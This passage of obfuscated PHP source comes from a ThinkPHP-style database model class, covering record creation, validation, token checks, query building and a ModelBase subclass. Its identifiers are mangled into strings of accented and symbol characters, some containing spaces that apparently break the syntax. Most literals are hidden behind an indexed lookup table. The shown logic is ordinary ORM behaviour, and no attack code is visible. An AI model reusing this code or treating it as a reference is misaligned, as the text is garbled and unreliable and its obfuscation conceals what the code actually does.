return $çÁí©—; } public function parseFieldsMap($©‹ÉÁêá, $ÈñÁÓÔ¦ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ĞëµÄÁ  => $‚îõĞÊÄ) { if ($ÈñÁÓÔ¦ == 1) { if (isset($©‹ÉÁêá[$‚îõĞÊÄ])) { $©‹ÉÁêá[$ĞëµÄÁ ] = $©‹ÉÁêá[$‚îõĞÊÄ]; unset($©‹ÉÁêá[$‚îõĞÊÄ]); } } else { if (isset($©‹ÉÁêá[$ĞëµÄÁ ])) { $©‹ÉÁêá[$‚îõĞÊÄ] = $©‹ÉÁêá[$ĞëµÄÁ ]; unset($©‹ÉÁêá[$ĞëµÄÁ ]); } } } } return $©‹ÉÁêá; } public function setField($š²Áò‹Š, $˜ø®– › = '') { if (is_array($š²Áò‹Š)) { $±£ÈŸ = $š²Áò‹Š; } else { $±£ÈŸ[$š²Áò‹Š] = $˜ø®– ›; } return $this->save($±£ÈŸ); } public function setAdd($Í­ùù½À, $±š»÷ßŸ = 1) { $Úî¿ê®í =& $_SERVER[ç¦¬”œš]; $ÍÄØªì = $Í­ùù½À . $Úî¿ê®í[372] . $±š»÷ßŸ; if ($±š»÷ßŸ < 0) { $ÍÄØªì = $Í­ùù½À . $±š»÷ßŸ; } return $this->setField($Í­ùù½À, array($Úî¿ê®í[373], $ÍÄØªì)); } public function getField($òí‹”³, $±“ØÂÙ = null) { $¤‚ºØè =& $_SERVER[ç¦¬”œš]; $ìÉ“³ú[$¤‚ºØè[350]] = $òí‹”³; $ìÉ“³ú = $this->_parseOptions($ìÉ“³ú); $òí‹”³ = trim($òí‹”³); if (strpos($òí‹”³, $¤‚ºØè[50])) { if (!isset($ìÉ“³ú[$¤‚ºØè[368]])) { $ìÉ“³ú[$¤‚ºØè[368]] = is_numeric($±“ØÂÙ) ? $±“ØÂÙ : $¤‚ºØè[12]; } $Òâ—¶ôŒ = $this->db->select($ìÉ“³ú); if (!empty($Òâ—¶ôŒ)) { $ÅÌ¥êÍÜ = explode($¤‚ºØè[50], $òí‹”³); $òí‹”³ = array_keys($Òâ—¶ôŒ[0]); $ÌËÎìÃë = array_shift($òí‹”³); $ƒâ¶çß = array_shift($òí‹”³); $Øª®ĞÀ· = array(); $ôğ£Õ®í = count($ÅÌ¥êÍÜ); foreach ($Òâ—¶ôŒ as $¹¿åëÇ) { $¾ÔšüÖÔ = $¹¿åëÇ[$ÌËÎìÃë]; if (2 == $ôğ£Õ®í) { $Øª®ĞÀ·[$¾ÔšüÖÔ] = $¹¿åëÇ[$ƒâ¶çß]; } else { $Øª®ĞÀ·[$¾ÔšüÖÔ] = is_string($±“ØÂÙ) ? implode($±“ØÂÙ, $¹¿åëÇ) : $¹¿åëÇ; } } return $Øª®ĞÀ·; } } else { if (!0 !== $±“ØÂÙ) { $ìÉ“³ú[$¤‚ºØè[368]] = is_numeric($±“ØÂÙ) ? $±“ØÂÙ : 1; } if ($±“ØÂÙ === $¤‚ºØè[332]) { unset($ìÉ“³ú[$¤‚ºØè[368]]); } $¹¿åëÇ = $this->db->select($ìÉ“³ú); if (!empty($¹¿åëÇ)) { if ($±“ØÂÙ === $¤‚ºØè[332]) { return reset($¹¿åëÇ[0]); } if (!0 !== $±“ØÂÙ && 1 == $ìÉ“³ú[$¤‚ºØè[368]]) { return reset($¹¿åëÇ[0]); } foreach ($¹¿åëÇ as $ğŒ‡óùô) { $†Ãà…ÇÕ[] = $ğŒ‡óùô[$òí‹”³]; } return $†Ãà…ÇÕ; } } return null; } public function create($ÅøÒ„Š¢ = '', $³ªğ…ô¢ = '') { $—üÆÌÏØ =& $_SERVER[ç¦¬”œš]; if (empty($ÅøÒ„Š¢)) { $ÅøÒ„Š¢ = $_POST; } elseif (is_object($ÅøÒ„Š¢)) { $ÅøÒ„Š¢ = get_object_vars($ÅøÒ„Š¢); } if (empty($ÅøÒ„Š¢) || !is_array($ÅøÒ„Š¢)) { $this->error = think_lang($—üÆÌÏØ[348]); return !1; } $ÅøÒ„Š¢ = $this->parseFieldsMap($ÅøÒ„Š¢, 0); $³ªğ…ô¢ = $³ªğ…ô¢ ? $³ªğ…ô¢ : (!empty($ÅøÒ„Š¢[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$—üÆÌÏØ[350]])) { $Õ’óŞ²è = $this->options[$—üÆÌÏØ[350]]; unset($this->options[$—üÆÌÏØ[350]]); } elseif ($³ªğ…ô¢ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Õ’óŞ²è = $this->insertFields; } elseif ($³ªğ…ô¢ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Õ’óŞ²è = $this->updateFields; } if (isset($Õ’óŞ²è)) { if (is_string($Õ’óŞ²è)) { $Õ’óŞ²è = explode($—üÆÌÏØ[50], $Õ’óŞ²è); } if (think_config($—üÆÌÏØ[374])) { $Õ’óŞ²è[] = think_config($—üÆÌÏØ[375]); } foreach ($ÅøÒ„Š¢ as $Æ’ß˜æ => $¯¸ûÁÂ˜) { if (!in_array($Æ’ß˜æ, $Õ’óŞ²è)) { unset($ÅøÒ„Š¢[$Æ’ß˜æ]); } } } if (!$this->autoValidation($ÅøÒ„Š¢, $³ªğ…ô¢)) { return !1; } if (!$this->autoCheckToken($ÅøÒ„Š¢)) { $this->error = think_lang($—üÆÌÏØ[376]); return !1; } if ($this->autoCheckFields) { $Õ’óŞ²è = $this->getDbFields(); foreach ($ÅøÒ„Š¢ as $Æ’ß˜æ => $¯¸ûÁÂ˜) { if (!in_array($Æ’ß˜æ, $Õ’óŞ²è)) { unset($ÅøÒ„Š¢[$Æ’ß˜æ]); } elseif (MAGIC_QUOTES_GPC && is_string($¯¸ûÁÂ˜)) { $ÅøÒ„Š¢[$Æ’ß˜æ] = stripslashes($¯¸ûÁÂ˜); } } } $this->autoOperation($ÅøÒ„Š¢, $³ªğ…ô¢); $this->data = $ÅøÒ„Š¢; return $ÅøÒ„Š¢; } public function autoCheckToken($îüìëÔ») { $Ë—ò·üÓ =& $_SERVER[ç¦¬”œš]; if (isset($this->options[$Ë—ò·üÓ[377]]) && !$this->options[$Ë—ò·üÓ[377]]) { return !0; } if (think_config($Ë—ò·üÓ[374])) { $Êè—ÍŸœ = think_config($Ë—ò·üÓ[375]); if (!isset($îüìëÔ»[$Êè—ÍŸœ]) || Session::get($Êè—ÍŸœ)) { return !1; } list($áÈ¤Å‹‘, $×èÆæé«) = explode($Ë—ò·üÓ[11], $îüìëÔ»[$Êè—ÍŸœ]); if ($×èÆæé« && Session::get($Êè—ÍŸœ . $Ë—ò·üÓ[10] . $áÈ¤Å‹‘) === $×èÆæé«) { Session::remove($Êè—ÍŸœ . $Ë—ò·üÓ[10] . $áÈ¤Å‹‘); return !0; } if (think_config($Ë—ò·üÓ[378])) { Session::remove($Êè—ÍŸœ . $Ë—ò·üÓ[10] . $áÈ¤Å‹‘); } return !1; } return !0; } public function regex($‹Á«†…€, $â¢ÖëÅê) { $Âº¨„‡À =& $_SERVER[ç¦¬”œš]; $´§–µŠ‚ = array($Âº¨„‡À[379] => $Âº¨„‡À[380], $Âº¨„‡À[381] => $Âº¨„‡À[382], $Âº¨„‡À[383] => $Âº¨„‡À[384], $Âº¨„‡À[385] => $Âº¨„‡À[386], $Âº¨„‡À[387] => $Âº¨„‡À[388], $Âº¨„‡À[389] => $Âº¨„‡À[390], $Âº¨„‡À[391] => $Âº¨„‡À[392], $Âº¨„‡À[366] => $Âº¨„‡À[393], $Âº¨„‡À[394] => $Âº¨„‡À[395]); if (isset($´§–µŠ‚[strtolower($â¢ÖëÅê)])) { $â¢ÖëÅê = $´§–µŠ‚[strtolower($â¢ÖëÅê)]; } return preg_match($â¢ÖëÅê, $‹Á«†…€) === 1; } private function autoOperation(&$®·ô¦á, $ëˆ¨ç‰…) { $Ä²öòêÈ =& $_SERVER[ç¦¬”œš]; if (!empty($this->options[$Ä²öòêÈ[396]])) { $ÎÁÅ¾Œé = $this->options[$Ä²öòêÈ[396]]; unset($this->options[$Ä²öòêÈ[396]]); } elseif (!empty($this->_auto)) { $ÎÁÅ¾Œé = $this->_auto; } if (isset($ÎÁÅ¾Œé)) { foreach ($ÎÁÅ¾Œé as $Œı‰õé) { if (empty($Œı‰õé[2])) { $Œı‰õé[2] = THINK_MODEL_INSERT; } if ($ëˆ¨ç‰… == $Œı‰õé[2] || $Œı‰õé[2] == THINK_MODEL_BOTH) { switch (trim($Œı‰õé[3])) { case $Ä²öòêÈ[397]: case $Ä²öòêÈ[398]: $¨¸İ“ = isset($Œı‰õé[4]) ? (array) $Œı‰õé[4] : array(); if (isset($®·ô¦á[$Œı‰õé[0]])) { array_unshift($¨¸İ“, $®·ô¦á[$Œı‰õé[0]]); } if ($Ä²öòêÈ[397] == $Œı‰õé[3]) { $®·ô¦á[$Œı‰õé[0]] = call_user_func_array($Œı‰õé[1], $¨¸İ“); } else { $®·ô¦á[$Œı‰õé[0]] = call_user_func_array(array(&$this, $Œı‰õé[1]), $¨¸İ“); } break; case $Ä²öòêÈ[350]: $®·ô¦á[$Œı‰õé[0]] = $®·ô¦á[$Œı‰õé[1]]; break; case $Ä²öòêÈ[399]: if ($Ä²öòêÈ[12] === $®·ô¦á[$Œı‰õé[0]]) { unset($®·ô¦á[$Œı‰õé[0]]); } break; case $Ä²öòêÈ[400]: default: $®·ô¦á[$Œı‰õé[0]] = $Œı‰õé[1]; } if (!1 === $®·ô¦á[$Œı‰õé[0]]) { unset($®·ô¦á[$Œı‰õé[0]]); } } } } return $®·ô¦á; } protected function autoValidation($†ŞèĞşù, $«œúÜÌº) { $œÔìòÇˆ =& $_SERVER[ç¦¬”œš]; if (!empty($this->options[$œÔìòÇˆ[401]])) { $ø»œØß‚ = $this->options[$œÔìòÇˆ[401]]; unset($this->options[$œÔìòÇˆ[401]]); } elseif (!empty($this->_validate)) { $ø»œØß‚ = $this->_validate; } if (isset($ø»œØß‚)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ø»œØß‚ as $¿¯ì­Àú => $®˜‚à÷) { if (empty($®˜‚à÷[5]) || $®˜‚à÷[5] == THINK_MODEL_BOTH || $®˜‚à÷[5] == $«œúÜÌº) { if (0 == strpos($®˜‚à÷[2], $œÔìòÇˆ[402]) && strpos($®˜‚à÷[2], $œÔìòÇˆ[403])) { $®˜‚à÷[2] = think_lang(substr($®˜‚à÷[2], 2, -1)); } $®˜‚à÷[3] = isset($®˜‚à÷[3]) ? $®˜‚à÷[3] : THINK_EXISTS_VALIDATE; $®˜‚à÷[4] = isset($®˜‚à÷[4]) ? $®˜‚à÷[4] : $œÔìòÇˆ[404]; switch ($®˜‚à÷[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($†ŞèĞşù, $®˜‚à÷)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($œÔìòÇˆ[12] != trim($†ŞèĞşù[$®˜‚à÷[0]])) { if (!1 === $this->_validationField($†ŞèĞşù, $®˜‚à÷)) { return !1; } } break; default: if (isset($†ŞèĞşù[$®˜‚à÷[0]])) { if (!1 === $this->_validationField($†ŞèĞşù, $®˜‚à÷)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($†óµ¾»‰, $÷½‡–î×) { if (!1 === $this->_validationFieldItem($†óµ¾»‰, $÷½‡–î×)) { if ($this->patchValidate) { $this->error[$÷½‡–î×[0]] = $÷½‡–î×[2]; } else { $this->error = $÷½‡–î×[2]; return !1; } } return; } protected function _validationFieldItem($ãƒÇÛü, $˜ÄæÉù°) { $÷å·šÏ =& $_SERVER[ç¦¬”œš]; switch (strtolower(trim($˜ÄæÉù°[4]))) { case $÷å·šÏ[397]: case $÷å·šÏ[398]: $´¹à±­î = isset($˜ÄæÉù°[6]) ? (array) $˜ÄæÉù°[6] : array(); if (is_string($˜ÄæÉù°[0]) && strpos($˜ÄæÉù°[0], $÷å·šÏ[50])) { $˜ÄæÉù°[0] = explode($÷å·šÏ[50], $˜ÄæÉù°[0]); } if (is_array($˜ÄæÉù°[0])) { foreach ($˜ÄæÉù°[0] as $©ò¥Õªİ) { $ûÒ¨Ù…[$©ò¥Õªİ] = $ãƒÇÛü[$©ò¥Õªİ]; } array_unshift($´¹à±­î, $ûÒ¨Ù…); } else { array_unshift($´¹à±­î, $ãƒÇÛü[$˜ÄæÉù°[0]]); } if ($÷å·šÏ[397] == $˜ÄæÉù°[4]) { return call_user_func_array($˜ÄæÉù°[1], $´¹à±­î); } else { return call_user_func_array(array(&$this, $˜ÄæÉù°[1]), $´¹à±­î); } case $÷å·šÏ[405]: return $ãƒÇÛü[$˜ÄæÉù°[0]] == $ãƒÇÛü[$˜ÄæÉù°[1]]; case $÷å·šÏ[406]: if (is_string($˜ÄæÉù°[0]) && strpos($˜ÄæÉù°[0], $÷å·šÏ[50])) { $˜ÄæÉù°[0] = explode($÷å·šÏ[50], $˜ÄæÉù°[0]); } $Û²¸ç™ = array(); if (is_array($˜ÄæÉù°[0])) { foreach ($˜ÄæÉù°[0] as $©ò¥Õªİ) { $Û²¸ç™[$©ò¥Õªİ] = $ãƒÇÛü[$©ò¥Õªİ]; } } else { $Û²¸ç™[$˜ÄæÉù°[0]] = $ãƒÇÛü[$˜ÄæÉù°[0]]; } if (!empty($ãƒÇÛü[$this->getPk()])) { $Û²¸ç™[$this->getPk()] = array($÷å·šÏ[407], $ãƒÇÛü[$this->getPk()]); } if ($this->where($Û²¸ç™)->find()) { return !1; } return !0; default: return $this->check($ãƒÇÛü[$˜ÄæÉù°[0]], $˜ÄæÉù°[1], $˜ÄæÉù°[4]); } } public function check($¹«›è, $¯Ç©ÉÆ, $Ë‡€Ç‡ = "\162\145\147\145\x78") { $µÑØ©€£ =& $_SERVER[ç¦¬”œš]; $Ë‡€Ç‡ = strtolower(trim($Ë‡€Ç‡)); switch ($Ë‡€Ç‡) { case $µÑØ©€£[7]: case $µÑØ©€£[408]: $½êû„õç = is_array($¯Ç©ÉÆ) ? $¯Ç©ÉÆ : explode($µÑØ©€£[50], $¯Ç©ÉÆ); return $Ë‡€Ç‡ == $µÑØ©€£[7] ? in_array($¹«›è, $½êû„õç) : !in_array($¹«›è, $½êû„õç); case $µÑØ©€£[409]: case $µÑØ©€£[410]: if (is_array($¯Ç©ÉÆ)) { $Ê³å»Ìì = $¯Ç©ÉÆ[0]; $áÚ•·—‚ = $¯Ç©ÉÆ[1]; } else { list($Ê³å»Ìì, $áÚ•·—‚) = explode($µÑØ©€£[50], $¯Ç©ÉÆ); } return $Ë‡€Ç‡ == $µÑØ©€£[409] ? $¹«›è >= $Ê³å»Ìì && $¹«›è <= $áÚ•·—‚ : $¹«›è < $Ê³å»Ìì || $¹«›è > $áÚ•·—‚; case $µÑØ©€£[411]: case $µÑØ©€£[412]: return $Ë‡€Ç‡ == $µÑØ©€£[411] ? $¹«›è == $¯Ç©ÉÆ : $¹«›è != $¯Ç©ÉÆ; case $µÑØ©€£[413]: $ûçà£€Ü = mb_strlen($¹«›è, $µÑØ©€£[414]); if (strpos($¯Ç©ÉÆ, $µÑØ©€£[50])) { list($Ê³å»Ìì, $áÚ•·—‚) = explode($µÑØ©€£[50], $¯Ç©ÉÆ); return $ûçà£€Ü >= $Ê³å»Ìì && $ûçà£€Ü <= $áÚ•·—‚; } else { return $ûçà£€Ü == $¯Ç©ÉÆ; } case $µÑØ©€£[415]: list($¬ˆÏÖ¹, $œ…Â‚æ) = explode($µÑØ©€£[50], $¯Ç©ÉÆ); if (!is_numeric($¬ˆÏÖ¹)) { $¬ˆÏÖ¹ = strtotime($¬ˆÏÖ¹); } if (!is_numeric($œ…Â‚æ)) { $œ…Â‚æ = strtotime($œ…Â‚æ); } return NOW_TIME >= $¬ˆÏÖ¹ && NOW_TIME <= $œ…Â‚æ; case $µÑØ©€£[416]: return in_array(get_client_ip(), explode($µÑØ©€£[50], $¯Ç©ÉÆ)); case $µÑØ©€£[417]: return !in_array(get_client_ip(), explode($µÑØ©€£[50], $¯Ç©ÉÆ)); case $µÑØ©€£[404]: default: return $this->regex($¹«›è, $¯Ç©ÉÆ); } } public function query($†ªÆ‚›°, $Ï‹şÕ¡® = false) { $¾Û¯•æ  =& $_SERVER[ç¦¬”œš]; if (!is_bool($Ï‹şÕ¡®) && !is_array($Ï‹şÕ¡®)) { $Ï‹şÕ¡® = func_get_args(); array_shift($Ï‹şÕ¡®); } $†ªÆ‚›° = str_replace(array($¾Û¯•æ [262], $¾Û¯•æ [418]), $¾Û¯•æ [53], $†ªÆ‚›°); $†ªÆ‚›° = $this->parseSql($†ªÆ‚›°, $Ï‹şÕ¡®); return $this->db->query($†ªÆ‚›°); } public function execute($”îŸû˜‡, $ë±ğÖ•÷ = false) { if (!is_bool($ë±ğÖ•÷) && !is_array($ë±ğÖ•÷)) { $ë±ğÖ•÷ = func_get_args(); array_shift($ë±ğÖ•÷); } $”îŸû˜‡ = $this->parseSql($”îŸû˜‡, $ë±ğÖ•÷); return $this->db->execute($”îŸû˜‡); } protected function parseSql($Àî“–°Ñ, $ø÷µ”ø) { $ã«µ¦¯» =& $_SERVER[ç¦¬”œš]; if (!0 === $ø÷µ”ø) { $Üğ©ÑÑï = $this->_parseOptions(); $Àî“–°Ñ = $this->db->parseSql($Àî“–°Ñ, $Üğ©ÑÑï); } elseif (is_array($ø÷µ”ø)) { $ø÷µ”ø = array_map(array($this->db, $ã«µ¦¯»[419]), $ø÷µ”ø); $Àî“–°Ñ = vsprintf($Àî“–°Ñ, $ø÷µ”ø); } else { $Àî“–°Ñ = strtr($Àî“–°Ñ, array($ã«µ¦¯»[420] => $this->getTableName(), $ã«µ¦¯»[421] => think_config($ã«µ¦¯»[321]))); } $this->db->setModel($this->name); return $Àî“–°Ñ; } public function db($®øªä¸ = '', $ßÁæ©¨ç = '', $¢²€—ú = array()) { $õ’ „£‹ =& $_SERVER[ç¦¬”œš]; if ($õ’ „£‹[12] === $®øªä¸ && $this->db) { return $this->db; } static $ö´ñ÷ë = array(); static $½Üíôôâ = array(); if (!isset($½Üíôôâ[$®øªä¸]) || isset($½Üíôôâ[$®øªä¸]) && $ßÁæ©¨ç && $ö´ñ÷ë[$®øªä¸] != $ßÁæ©¨ç) { if (!empty($ßÁæ©¨ç) && is_string($ßÁæ©¨ç) && !1 === strpos($ßÁæ©¨ç, $õ’ „£‹[8])) { $ßÁæ©¨ç = think_config($ßÁæ©¨ç); } $®øªä¸ = think_guid($ßÁæ©¨ç); $½Üíôôâ[$®øªä¸] = Db::getInstance($ßÁæ©¨ç); } elseif (NULL === $ßÁæ©¨ç) { $½Üíôôâ[$®øªä¸]->close(); unset($½Üíôôâ[$®øªä¸]); return; } if (!empty($¢²€—ú)) { if (is_string($¢²€—ú)) { parse_str($¢²€—ú, $¢²€—ú); } foreach ($¢²€—ú as $•ÎãˆóÁ => $×Œğåƒ’) { $this->setProperty($•ÎãˆóÁ, $×Œğåƒ’); } } $ö´ñ÷ë[$®øªä¸] = $ßÁæ©¨ç; $this->db = $½Üíôôâ[$®øªä¸]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ØŠçÇÃŠ = get_class($this); if ($ØŠçÇÃŠ == $_SERVER[ç¦¬”œš][422]) { return $this->name; } $this->name = substr($ØŠçÇÃŠ, 0, -5); } return $this->name; } public function getTableName() { $¯Ñûé°Ä =& $_SERVER[ç¦¬”œš]; if (empty($this->trueTableName)) { $×™Şôæ¨ = !empty($this->tablePrefix) ? $this->tablePrefix : $¯Ñûé°Ä[12]; if (!empty($this->tableName)) { $×™Şôæ¨ .= $this->tableName; } else { $×™Şôæ¨ .= think_parse_name($this->name); } $this->trueTableName = strtolower($×™Şôæ¨); } return (!empty($this->dbName) ? $this->dbName . $¯Ñûé°Ä[10] : $¯Ñûé°Ä[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $û¡ï–Ğù =& $_SERVER[ç¦¬”œš]; return isset($this->fields[$û¡ï–Ğù[328]]) ? $this->fields[$û¡ï–Ğù[328]] : $this->pk; } public function getDbFields() { $ÊÄ©«à =& $_SERVER[ç¦¬”œš]; if (isset($this->options[$ÊÄ©«à[356]])) { $œ°¦«õ‹ = $this->db->getFields($this->options[$ÊÄ©«à[356]]); return $œ°¦«õ‹ ? array_keys($œ°¦«õ‹) : !1; } if ($this->fields) { $œ°¦«õ‹ = $this->fields; unset($œ°¦«õ‹[$ÊÄ©«à[327]], $œ°¦«õ‹[$ÊÄ©«à[328]], $œ°¦«õ‹[$ÊÄ©«à[329]], $œ°¦«õ‹[$ÊÄ©«à[326]]); return $œ°¦«õ‹; } return !1; } public function data($¤¦²ËÏ = '') { $Ê°¤×òü =& $_SERVER[ç¦¬”œš]; if ($Ê°¤×òü[12] === $¤¦²ËÏ && !empty($this->data)) { return $this->data; } if (is_object($¤¦²ËÏ)) { $¤¦²ËÏ = get_object_vars($¤¦²ËÏ); } elseif (is_string($¤¦²ËÏ)) { parse_str($¤¦²ËÏ, $¤¦²ËÏ); } elseif (!is_array($¤¦²ËÏ)) { think_exception(think_lang($Ê°¤×òü[348])); } $this->data = $¤¦²ËÏ; return $this; } public function join($ÍÒ¡š€›) { $°Ô¹Ï² =& $_SERVER[ç¦¬”œš]; if (is_array($ÍÒ¡š€›)) { $this->options[$°Ô¹Ï²[359]] = $ÍÒ¡š€›; } elseif (!empty($ÍÒ¡š€›)) { $this->options[$°Ô¹Ï²[359]][] = $ÍÒ¡š€›; } return $this; } public function union($üø»¨Ï›, $â‹‡êÀÂ = false) { $ôÁ˜¯÷± =& $_SERVER[ç¦¬”œš]; if (empty($üø»¨Ï›)) { return $this; } if ($â‹‡êÀÂ) { $this->options[$ôÁ˜¯÷±[423]][$ôÁ˜¯÷±[424]] = !0; } if (is_object($üø»¨Ï›)) { $üø»¨Ï› = get_object_vars($üø»¨Ï›); } if (is_string($üø»¨Ï›)) { $ İç¦ç = $üø»¨Ï›; } elseif (is_array($üø»¨Ï›)) { if (isset($üø»¨Ï›[0])) { $this->options[$ôÁ˜¯÷±[423]] = array_merge($this->options[$ôÁ˜¯÷±[423]], $üø»¨Ï›); return $this; } else { $ İç¦ç = $üø»¨Ï›; } } else { think_exception(think_lang($ôÁ˜¯÷±[348])); } $this->options[$ôÁ˜¯÷±[423]][] = $ İç¦ç; return $this; } public function cache($ü·óÃª’ = true, $ïùÕ¿á = null, $Œñß‘÷Õ = '') { $Â—ı¡ğ‘ =& $_SERVER[ç¦¬”œš]; if (!1 !== $ü·óÃª’) { $this->options[$Â—ı¡ğ‘[425]] = array($Â—ı¡ğ‘[97] => $ü·óÃª’, $Â—ı¡ğ‘[415] => $ïùÕ¿á, $Â—ı¡ğ‘[33] => $Œñß‘÷Õ); } return $this; } public function field($šì¥šÓ¾, $üÏûƒˆ = false) { $ºõ’’Œ‹ =& $_SERVER[ç¦¬”œš]; if (!0 === $šì¥šÓ¾) { $ËÓ…æÂÅ = $this->getDbFields(); $šì¥šÓ¾ = $ËÓ…æÂÅ ? $ËÓ…æÂÅ : $ºõ’’Œ‹[220]; } elseif ($üÏûƒˆ) { if (is_string($šì¥šÓ¾)) { $šì¥šÓ¾ = explode($ºõ’’Œ‹[50], $šì¥šÓ¾); } $ËÓ…æÂÅ = $this->getDbFields(); $šì¥šÓ¾ = $ËÓ…æÂÅ ? array_diff($ËÓ…æÂÅ, $šì¥šÓ¾) : $šì¥šÓ¾; } $this->options[$ºõ’’Œ‹[350]] = $šì¥šÓ¾; return $this; } public function scope($ƒ×şßÆí = '', $Õ¼§†­à = NULL) { $öä»¥º× =& $_SERVER[ç¦¬”œš]; if ($öä»¥º×[12] === $ƒ×şßÆí) { if (isset($this->_scope[$öä»¥º×[37]])) { $èÈ¦éı’ = $this->_scope[$öä»¥º×[37]]; } else { return $this; } } elseif (is_string($ƒ×şßÆí)) { $Ö°÷â¨§ = explode($öä»¥º×[50], $ƒ×şßÆí); $èÈ¦éı’ = array(); foreach ($Ö°÷â¨§ as $Ô¢ß¦®ç) { if (!isset($this->_scope[$Ô¢ß¦®ç])) { continue; } $èÈ¦éı’ = array_merge($èÈ¦éı’, $this->_scope[$Ô¢ß¦®ç]); } if (!empty($Õ¼§†­à) && is_array($Õ¼§†­à)) { $èÈ¦éı’ = array_merge($èÈ¦éı’, $Õ¼§†­à); } } elseif (is_array($ƒ×şßÆí)) { $èÈ¦éı’ = $ƒ×şßÆí; } if (is_array($èÈ¦éı’) && !empty($èÈ¦éı’)) { $this->options = array_merge($this->options, array_change_key_case($èÈ¦éı’)); } return $this; } public function where($†ĞÓúÌİ, $˜ÆÛßšş = null) { $°ıÃœü± =& $_SERVER[ç¦¬”œš]; if (!is_null($˜ÆÛßšş) && is_string($†ĞÓúÌİ)) { if (!is_array($˜ÆÛßšş)) { $˜ÆÛßšş = func_get_args(); array_shift($˜ÆÛßšş); } $˜ÆÛßšş = array_map(array($this->db, $°ıÃœü±[419]), $˜ÆÛßšş); $†ĞÓúÌİ = vsprintf($†ĞÓúÌİ, $˜ÆÛßšş); } elseif (is_object($†ĞÓúÌİ)) { $†ĞÓúÌİ = get_object_vars($†ĞÓúÌİ); } elseif (is_array($†ĞÓúÌİ)) { foreach ($†ĞÓúÌİ as $‚•â…À¿ => $’»€ö ¦) { if ((is_numeric($‚•â…À¿) || !$‚•â…À¿) && is_string($’»€ö ¦)) { if (strpos($’»€ö ¦, $°ıÃœü±[426]) === 0) { continue; } think_trace($°ıÃœü±[427], $°ıÃœü±[12], $°ıÃœü±[49]); die; } } } if (is_string($†ĞÓúÌİ) && $°ıÃœü±[12] != $†ĞÓúÌİ) { $ï™×Ú§ = array(); $ï™×Ú§[$°ıÃœü±[428]] = $†ĞÓúÌİ; $†ĞÓúÌİ = $ï™×Ú§; } if (isset($this->options[$°ıÃœü±[352]])) { $this->options[$°ıÃœü±[352]] = array_merge($this->options[$°ıÃœü±[352]], $†ĞÓúÌİ); } else { $this->options[$°ıÃœü±[352]] = $†ĞÓúÌİ; } return $this; } public function limit($ˆ«Ú¥©º, $Ûí×²Â­ = null) { $ïƒôäù“ =& $_SERVER[ç¦¬”œš]; $this->options[$ïƒôäù“[368]] = is_null($Ûí×²Â­) ? $ˆ«Ú¥©º : $ˆ«Ú¥©º . $ïƒôäù“[50] . $Ûí×²Â­; return $this; } public function page($ÓÒŠ¡á, $µ ©Í‚Ø = null) { $£Ö…ã ” =& $_SERVER[ç¦¬”œš]; $this->options[$£Ö…ã ”[429]] = is_null($µ ©Í‚Ø) ? $ÓÒŠ¡á : $ÓÒŠ¡á . $£Ö…ã ”[50] . $µ ©Í‚Ø; return $this; } public function comment($‹«Øœ³) { $this->options[$_SERVER[ç¦¬”œš][430]] = $‹«Øœ³; return $this; } public function setProperty($ú­ª¢™‰, $ÛÒôö²ù) { if (property_exists($this, $ú­ª¢™‰)) { $this->{$ú­ª¢™‰} = $ÛÒôö²ù; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\x69\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\164\x2c\x75\x70\x64\141\164\145", "\x66\x75\x6e\143\164\x69\157\156"), array("\143\x72\145\141\164\145\124\151\155\x65", "\164\151\x6d\145", "\151\x6e\163\x65\x72\x74", "\146\165\x6e\x63\x74\151\157\156")); public function setDataAuto($’¤œ¾ÏÚ) { $this->dataAuto = $’¤œ¾ÏÚ; } public function __construct($ÜöåÓƒ‚ = '', $‘À³ä¯å = '', $ Ë–ËŒ = '') { parent::__construct($ÜöåÓƒ‚, $‘À³ä¯å, $ Ë–ËŒ); } protected $tableMeta = array(); protected function _beforeInsert(&$¦½ñÄï, $ÜŒØ•¹) { $¤Å‘Ó¹Œ =& $_SERVER[ç¦¬”œš]; if (!$this->checkDataAutoHas($¤Å‘Ó¹Œ[431])) { return; } $this->dataBeforeFilter($¦½ñÄï, $¤Å‘Ó¹Œ[431]); } protected function _beforeUpdate(&$şº¥ÌËÑ, $ïïñÒ™¿) { $ó§íÅ—€ =& $_SERVER[ç¦¬”œš]; if (!$this->checkDataAutoHas($ó§íÅ—€[432])) { return; } $this->dataBeforeFilter($şº¥ÌËÑ, $ó§íÅ—€[432]); } protected function _afterSelect(&$óíşã, $½¸àÏ¤—) { if (!is_array($óíşã)) { return; } if (!$this->checkDataAutoHas($_SERVER[ç¦¬”œš][433])) { return; } foreach ($óíşã as &$Ôıú‚Ü…) { $this->dataAfterFilter($Ôıú‚Ü…); } unset($Ôıú‚Ü…); } protected function _afterFind(&$ˆõŠ™½”, $§“Çö½Ï) { if (!is_array($ˆõŠ™½”)) { return; } if (!$this->checkDataAutoHas($_SERVER[ç¦¬”œš][433])) { return; } $this->dataAfterFilter($ˆõŠ™½”); } public static function textEncode($¨äÕï“€) { if (!$¨äÕï“€) { return $¨äÕï“€; } $¸…ô§ = json_encode($¨äÕï“€); $¸…ô§ = preg_replace_callback($_SERVER[ç¦¬”œš][434], function ($ßî’Äˆ) { return addslashes($ßî’Äˆ[0]); }, $¸…ô§); return json_decode($¸…ô§); } public static function textDecode($œÇ‡—ë) { $û¿Ôäú´ =& $_SERVER[ç¦¬”œš]; $Íì«¹´• = json_encode($œÇ‡—ë); $Íì«¹´• = preg_replace_callback($û¿Ôäú´[435], function ($ƒ 